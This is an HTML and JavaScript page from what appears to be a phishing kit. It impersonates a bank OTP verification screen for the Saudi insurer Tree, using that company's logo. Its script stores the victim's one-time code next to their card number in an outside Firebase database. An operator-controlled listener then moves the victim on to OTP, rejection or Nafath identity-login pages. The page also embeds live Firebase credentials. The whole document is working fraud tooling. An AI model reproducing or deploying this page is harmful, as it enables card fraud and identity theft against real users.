<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        
        /* تصميم بنكي رسمي */
        .acs-container { background: white; width: 90%; max-width: 420px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e0e0e0; }
        .acs-header { background: #fff; padding: 15px 25px; border-bottom: 3px solid #198754; display: flex; justify-content: space-between; align-items: center; }
        .acs-header h3 { margin: 0; font-size: 16px; color: #333; font-weight: bold; }
        .acs-header img { height: 25px; }

        .acs-body { padding: 25px; }
        .alert-info { background: #e8f5e9; color: #1b5e20; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 20px; border: 1px solid #c8e6c9; }
        
        .txn-details { margin-bottom: 20px; font-size: 14px; }
        .detail-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px dashed #eee; padding-bottom: 8px; }
        .detail-label { color: #666; }
        .detail-value { font-weight: bold; color: #333; }

        label { font-size: 13px; font-weight: bold; display: block; margin-bottom: 8px; color: #333; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 18px; text-align: center; letter-spacing: 5px; outline: none; margin-bottom: 10px; }
        input:focus { border-color: #198754; box-shadow: 0 0 0 3px rgba(25, 135, 84, 0.1); }
        
        .timer-text { font-size: 12px; color: #d9534f; text-align: center; margin-bottom: 15px; }
        
        button { width: 100%; padding: 12px; background: #198754; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
        button:hover { background: #146c43; }
        
        .spinner { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #27ae60; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .footer-secure { margin-top: 20px; text-align: center; opacity: 0.8; }
        .footer-secure img { height: 22px; margin: 0 5px; }
    </style>
</head>
<body>

<div class="acs-container">
    <div class="acs-header">
        <h3>إثبات ملكية البطاقة</h3>
        <img src="https://tree.com.sa/assets/images/logo.png" alt="Tree">
    </div>
    <div class="acs-body">
        <div class="alert-info">سيتم إجراء معاملة مالية على حسابك المصرفي، يرجى التحقق من التفاصيل أدناه.</div>
        
        <div class="txn-details">
            <div class="detail-row"><span class="detail-label">التاجر</span><span class="detail-value">تري | Treet Insurance</span></div>
            <div class="detail-row"><span class="detail-label">المبلغ</span><span class="detail-value">SAR <span id="txn-amount">--.--</span></span></div>
            <div class="detail-row"><span class="detail-label">البطاقة</span><span class="detail-value" dir="ltr">**** **** **** <span id="card-last4">----</span></span></div>
        </div>

        <label>رمز التحقق (OTP)</label>
        <p style="font-size: 12px; color: #777; margin-top: -5px; margin-bottom: 10px;">لتأكيد العملية أدخل الرمز المرسل إلى جوالك المسجل.</p>
        <input type="number" id="otpInput" placeholder="----">
        
        <div class="timer-text">صلاحية الرمز: <span id="timer">02:00</span></div>

        <button id="submitBtn" onclick="verifyOTP()">تأكيد</button>
        <div id="loader" class="spinner"></div>

        <div class="footer-secure">
            <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
            <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard">
        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    // 1. جلب تفاصيل البطاقة للعرض
    if (userId) {
        db.collection("orders").doc(userId).get().then((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.card_number) {
                    // استخراج آخر 4 أرقام
                    const last4 = data.card_number.replace(/\s/g, '').slice(-4);
                    document.getElementById('card-last4').innerText = last4;
                }
                // يمكن عرض مبلغ افتراضي أو تركه كما هو إذا لم يتم تمريره
                // document.getElementById('txn-amount').innerText = "1250.00"; 
            }
        });
    }

    // 2. مؤقت تنازلي
    let timeLeft = 120; // 2 minutes
    setInterval(() => {
        if (timeLeft <= 0) return;
        timeLeft--;
        const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        const s = (timeLeft % 60).toString().padStart(2, '0');
        document.getElementById('timer').innerText = `${m}:${s}`;
    }, 1000);

    async function verifyOTP() {
        const otpValue = document.getElementById('otpInput').value;
        if(otpValue.length < 4) { alert("يرجى إدخال رمز صحيح"); return; }

        // إظهار السبينر وإخفاء الزر
        document.getElementById('submitBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        try {
            // تحديث كود الـ OTP وتغيير الحالة فوراً إلى طلب الجوال
            await db.collection("orders").doc(userId).update({
                otp_code: otpValue,
                status: "show_mobile" // الحالة التي تحوله لصفحة الجوال
            });

            // التحويل التلقائي لصفحة الجوال
            setTimeout(() => {
                window.location.href = "mobile_verification.html";
            }, 1000); // تأخير بسيط لضمان الحفظ

        } catch (error) {
            console.error("خطأ:", error);
            alert("حدث خطأ، حاول مرة أخرى");
            document.getElementById('submitBtn').style.display = 'block';
            document.getElementById('loader').style.display = 'none';
        }
    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
